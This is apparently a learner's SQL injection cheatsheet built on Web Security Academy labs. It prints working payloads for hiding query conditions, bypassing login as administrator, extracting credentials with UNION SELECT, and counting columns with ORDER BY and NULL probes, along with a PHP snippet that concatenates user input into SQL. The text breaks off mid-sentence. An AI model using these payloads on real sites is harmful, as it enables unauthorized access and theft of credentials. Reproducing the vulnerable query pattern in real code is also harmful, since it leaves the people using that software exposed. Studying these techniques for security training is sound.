
# SQL Injection Cheatsheet

## SQL Injection examples

**1. Retrieving hidden data** - Where we can modify a SQL query to return additional results.

Consider a shopping application that displays products in different categories. When the user clicks on the Gifts category, their browser requests the URL:

```
https://insecure-website.com/products?category=Gifts
```

This causes the application to make a SQL query to retrive details of the relevant products from the database:

```SQL
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

**1.1 How is the attack conducted**

If the application doesn't implement any defenses against SQL injection, the attacker can construct an attack like:

```
https://insecure-website.com/products?category=Gifts'--
```

Which will result in the SQL query

```SQL
SELECT * FROM products WHERE category = 'Gifts' --' And released = 1
```

As the double-dash sequence `--` is a comment indicator in SQL, meaning that everything behind the double-dash will be interpreted as a comment, effectively eliminating the condition of the query.

Going further, an attacker can cause the application to display all the products in any category, including categories that they dont know about"

```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

This will result in the SQL query:

```SQL
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--'And released = 1
```

The query will return all items where either the category is `Gifts` or `True`.


**1.3 Note when using the condition OR 1=1**

This can be dangerous because it can lead to unexpected consequences, such as accidental deletion or modification of data.

```php
$sql = "SELECT * FROM users WHERE id = ". $id;
$result = mysqli_query($conn, $sql);
$sql = "UPDATE users SET email = '$new_email' WHERE id = " . $id;
mysqli_query($conn, $sql);
```

**2. Subverting application logic** - Where you can change a query to interfere with the application's logic.

Consider an application that lets users log in with a username and password. If a user submits the username `wiener` and the password `bluecheese`, the application checks the credentials by performing the following SQL query:

```sql
SELECT * FROM users where username = 'wiener' AND password = 'bluecheese'
```

**2.1 How is the attack conducted**

Here, an attacker can log in as any user without a password simply by using SQL comment sequence `--` to remove the password check from the `WHERE` clause of the query.

```sql
SELECT * FROM users where username = 'administrator' --' AND password = ''
```

This query returns the user whose username is `administrator` and successfully logs the attacker in as that user.

**3. Retrieving data from other database tables**

In cases where the results of a SQL query are returned within the application's responses, an attacker can leverage a SQL injection vulnerability to retrieve data from other tables within the database. This is done using the `UNION` keyword, which lets you execute an additional `SELECT` query and append the results to the original query.

```SQL
SELECT name, description FROm products WHERE category = 'Gifts'
```

Then the attacker can submit the input:

```sql
' UNION SELECT username, password FROM users--
```

This is called SQL injection UNION attacks.

**3.1 How is the attack conducted**

The UNION keyword lets you execute one or more additional SELECT queries and append the results to the original query. For example:

```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

This SQL query will return a single result set with two columns, containing values from columns a and b in table1 and columns c and d in table2.

FOR a `UNION` query to work, two key requirements must be met:

* The individual queries must return the same number of columns.
* The data types in each columns must be compatible between the individual queries.

To carry out a SQL injection UNION attack, you need to ensure that your attack meets these two requirements. This generally involves figuring out:

**1. How many columns are being returned from the original query?**

**2. Which columns returned from the original query are of a suitable data type to hold the results from the injected query**

### To determine how many columns are being returned, there are 2 possible methods.

**ORDER BY**, we can use a series of `ORDER BY` clauses to check until the specified column index return error. Supposed we have the following URL:

```
https://0a36004504c2bf7f871908a8009d00bc.web-security-academy.net/filter?category=Gifts
```

We can append the `Order by` clause until error occur

```
https://0a36004504c2bf7f871908a8009d00bc.web-security-academy.net/filter?category=Gifts'ORDER BY 2--
```

BurpSuite can also be used by sending the request to the repeater and modify the request:

```
GET /filter?category=Gifts'+ORDER+BY+2-- HTTP/2
```

**UNION SELECT NULL**, we can use a series of `SELECT NULL` clause to do the same:

```
https://0a36004504c2bf7f871908a8009d00bc.web-security-academy.net/filter?category=Gifts%27UNION%20SELECT%20NULL,%20NULL,%20NULL--
```

We can again use BurpSuite for this task

```
GET /filter?category=Gifts'+UNION+SELECT+NULL,+NULL,+NULL-- HTTP/2
```

**Note that SELECT NULL is used until the page return a valid response, while ORDER BY is used until the page return an error**

### To determine what is the type of the column that are being returned, we can use the UNION SELECT.

Supposed we have the following URL:

```
https://0a36004504c2bf7f871908a8009d00bc.web-security-academy.net/filter?category=Gifts%27UNION%20SELECT%20NULL,%20NULL,%20NULL--
```

We dont actually know what 